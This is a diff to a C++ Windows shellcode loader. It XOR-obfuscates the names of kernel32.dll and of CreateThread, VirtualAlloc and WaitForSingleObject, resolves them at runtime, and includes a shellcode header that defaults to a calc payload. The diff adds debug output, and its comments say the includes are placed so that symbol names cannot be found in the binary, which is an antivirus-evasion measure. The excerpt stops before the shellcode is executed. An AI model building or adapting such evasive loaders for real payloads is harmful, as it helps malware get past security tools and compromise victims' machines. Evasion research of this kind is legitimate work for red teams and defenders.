@@ -1,12 +1,6 @@
 #include <windows.h>
 #include <cstdio>
 
-#ifdef SHELLCODE_PATH
-#include SHELLCODE_PATH
-#else
-#include "../../src/shellcodes/unobfuscated_calc.hpp"
-#endif
-
 
 void my_xor(unsigned char data[], int size, const unsigned char key[], int key_size)
 {
@@ -19,25 +13,58 @@ void my_xor(unsigned char data[], int size, const unsigned char key[], int key_s
 int main()
 {
 
-	// The #include is done here, because when done before the main function, the symbols' names can be found in the binary
+	// The multiple #include that declare variables are done here, because when done before the main function, the symbols' names can be found in the binary
 #include "functions.hpp"
+
+#ifdef SHELLCODE_PATH
+#include SHELLCODE_PATH
+#else
+#include "../../src/shellcodes/unobfuscated_calc.hpp"
+#endif
 
 	// Step 1 : Get the addresses of the functions we want to call
 
-	// Let's first get the address of the kernel32.dll module
-	// Also, the string containing "KERNEL32.dll" is XORed with the associated key, so we have to XOR it back
+	// Let's first deobfuscate all the names
 	my_xor(KERNEL32_dll_obfuscated_function_name, sizeof(KERNEL32_dll_obfuscated_function_name), KERNEL32_dll_key, sizeof(KERNEL32_dll_key));
-	HMODULE kernel32_dll = GetModuleHandleA((char*)KERNEL32_dll_obfuscated_function_name);
-
-	// The strings containing the function names are XORed with the associated key, so we have to XOR them back as well
 	my_xor(CreateThread_obfuscated_function_name, sizeof(CreateThread_obfuscated_function_name), CreateThread_key, sizeof(CreateThread_key));
 	my_xor(VirtualAlloc_obfuscated_function_name, sizeof(VirtualAlloc_obfuscated_function_name), VirtualAlloc_key, sizeof(VirtualAlloc_key));
 	my_xor(WaitForSingleObject_obfuscated_function_name, sizeof(WaitForSingleObject_obfuscated_function_name), WaitForSingleObject_key, sizeof(WaitForSingleObject_key));
+
+#if DEBUG
+	printf("deobfuscated function names : %s (at %p), %s (at %p), %s (at %p), %s (at %p)\n",
+		   CreateThread_obfuscated_function_name,
+		   CreateThread_obfuscated_function_name,
+		   VirtualAlloc_obfuscated_function_name,
+		   VirtualAlloc_obfuscated_function_name,
+		   WaitForSingleObject_obfuscated_function_name,
+		   WaitForSingleObject_obfuscated_function_name,
+		   KERNEL32_dll_obfuscated_function_name,
+		   KERNEL32_dll_obfuscated_function_name);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
+	// get the handle to the kernel32.dll module
+	HMODULE kernel32_dll = GetModuleHandleA((char*)KERNEL32_dll_obfuscated_function_name);
+
+#if DEBUG
+	printf("kernel32.dll handle : %p\n", kernel32_dll);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
 
 	// Get the addresses of the functions we want to call
 	FARPROC CreateThread_address = GetProcAddress(kernel32_dll, (char*)CreateThread_obfuscated_function_name);
 	FARPROC VirtualAlloc_address = GetProcAddress(kernel32_dll, (char*)VirtualAlloc_obfuscated_function_name);
 	FARPROC WaitForSingleObject_address = GetProcAddress(kernel32_dll, (char*)WaitForSingleObject_obfuscated_function_name);
+
+#if DEBUG
+	printf("CreateThread address : %p\n", CreateThread_address);
+	printf("VirtualAlloc address : %p\n", VirtualAlloc_address);
+	printf("WaitForSingleObject address : %p\n", WaitForSingleObject_address);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
 
 	// Finally, let's get pointers to the functions we want to call
 	typedef HANDLE (WINAPI* pCreateThread)(
